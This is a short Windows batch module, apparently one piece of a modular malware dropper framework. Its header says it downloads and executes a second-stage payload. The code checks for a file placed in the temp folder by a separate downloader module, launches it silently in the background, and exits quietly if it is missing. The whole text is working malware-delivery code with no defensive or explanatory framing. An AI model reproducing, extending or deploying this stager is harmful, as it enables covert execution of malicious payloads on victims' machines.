REM provides: delivery_stage
REM depends: delivery/downloader
REM description: Download and execute a second-stage payload

if not defined DL_PATH set "DL_PATH=%TEMP%\%PAYLOAD_NAME%"

REM Verify download succeeded
if not exist "%DL_PATH%" goto :stage_fail

REM Execute the payload
start /b "" "%DL_PATH%"
goto :stage_done

:stage_fail
REM Download failed, exit silently

:stage_done
